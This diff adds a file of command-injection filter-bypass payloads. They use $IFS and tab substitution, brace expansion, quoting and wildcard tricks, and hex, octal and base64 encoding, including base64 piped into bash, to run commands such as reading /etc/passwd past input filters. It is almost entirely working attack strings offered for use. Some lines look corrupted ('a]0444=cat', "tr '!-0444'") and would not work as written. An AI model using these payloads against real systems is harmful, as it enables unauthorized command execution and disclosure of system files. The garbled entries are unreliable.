@@ -1,0 +1,62 @@
+# Command Injection Filter Bypass
+
+# ============ Space bypass ============
+# Using $IFS (Internal Field Separator)
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+cat<>/etc/passwd
+
+# Using tabs
+cat%09/etc/passwd
+;%09id
+
+# Using brace expansion
+{cat,/etc/passwd}
+{ls,-la,/}
+
+# ============ Slash bypass ============
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0444' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+
+# ============ Keyword bypass ============
+# Using quotes
+c"a"t /etc/passwd
+c'a't /etc/passwd
+c\at /etc/passwd
+"c"at /etc/passwd
+'c'at /etc/passwd
+
+# Using wildcards
+/b?n/c?t /etc/passwd
+/b*n/c*t /etc/passwd
+/???/??t /etc/passwd
+
+# Using variables
+a]0444=cat;$a /etc/passwd
+c=c]0444;a=a;t=t;$c$a$t /etc/passwd
+
+# Using concatenation
+/bin/ca''t /etc/passwd
+/bin/ca""t /etc/passwd
+/bin/ca\t /etc/passwd
+
+# ============ Encoding bypass ============
+# Hex encoding
+$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
+`printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+
+# Octal encoding
+$(printf '\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144')
+
+# Base64 encoding
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
+bash -c '{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|{bash,-i}'
+
+# ============ Using env variables ============
+$SHELL -c 'id'
+${SHELL} -c 'id'
